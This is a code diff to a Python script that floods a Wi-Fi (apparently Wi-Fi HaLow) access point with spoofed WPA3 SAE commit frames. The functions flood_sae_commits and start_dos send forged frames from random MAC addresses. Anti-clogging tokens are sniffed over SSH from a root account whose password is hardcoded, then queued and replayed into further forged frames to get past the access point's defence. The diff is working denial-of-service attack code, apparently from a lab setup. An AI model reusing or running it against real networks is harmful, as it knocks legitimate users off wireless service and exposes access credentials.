@@ -7,13 +7,16 @@ import threading
 import subprocess
 import json
 import select
+import queue
 
+cookie_queue = queue.Queue()
 time_filter = f'frame.time >= "{time.time()}""'
 pcap = None
 
 stop_track = threading.Event()
 lock = threading.Lock()
 def _track_cookie():
+    global cookie_queue
     track_cmd = ["sshpass", "-p", "halow", "ssh", "root@10.42.0.1", "tcpdump", "-i", "morse0", "-u", "-s0", "-w", "-", "# LIVE_TOKEN_TRACKER"]
 
     buf = subprocess.Popen(track_cmd,stdout=subprocess.PIPE, stderr=subprocess.PIPE,bufsize=1024)
@@ -54,31 +57,11 @@ def _track_cookie():
                 cookie = bytes.fromhex(packet["layers"]["wlan_wlan_mgt"]["wlan_wlan_fixed_anti_clogging_token"].replace(":",""))
 
         if random_mac is not None and cookie is not None and ap_mac is not None:
-            frame_bytes = commit_frame(target_mac=ap_mac, src_mac=random_mac,cookie=cookie)
-            transmitData(frame_bytes)
+            cookie_queue.put((ap_mac,random_mac,cookie))
+            #frame_bytes = commit_frame(target_mac=ap_mac, src_mac=random_mac,cookie=cookie)
+            #transmitData(frame_bytes)
 
 
-    """
-    while True:
-        #condition to stop loop
-        if stop_track.is_set():
-            break
-        #set to be 0, allows for non blocking
-        r, _, _ = select.select([stdout], [], [], 0)
-
-        #condition to check that an output exist
-        if stdout in r:
-            cookie_extract = stdout.readline()
-            if cookie_extract:
-                print(cookie_extract)
-                new_cookie = bytes.fromhex(cookie_extract)
-                if cookie != new_cookie:
-                    print("new cookie")
-                    print(new_cookie)
-                    # lock so we can write to cookie
-                    with lock:
-                        cookie = new_cookie
-    """
     #terminate subprocesses
     tshark.terminate()
     tshark.wait()
@@ -101,12 +84,24 @@ def flood_sae_commits(ap_mac:str, duration:int=200, rate:float=16):
     """
     print(f"[*] Flooding {ap_mac} with a rate of {rate} SAE commit frames")
     start_time = time.time()
+    frame_bytes = None
+    test = 0
+    test_time = time.time()
     while time.time()- start_time < duration:
-        src = random_mac()
-        # lock, ensure cookie being transmitted if not none is not being overwritten while writing
-        with lock:
+        try:
+            q_ap_mac, q_random_mac, q_cookie = cookie_queue.get_nowait()
+            frame_bytes = commit_frame(target_mac=q_ap_mac, src_mac=q_random_mac,cookie=q_cookie)
+        except queue.Empty:        
+            src = random_mac()
             frame_bytes = commit_frame(target_mac=ap_mac, src_mac=src)
-            transmitData(frame_bytes)
+    
+        transmitData(frame_bytes)
+        test += 1
+        if test == rate:
+            print("time elapsed in seconds: ", time.time() - test_time)
+            print("transmitted: ", test, " frames")
+            test = 0
+            test_time = time.time()
         time.sleep(1/rate)
 
 def start_dos():
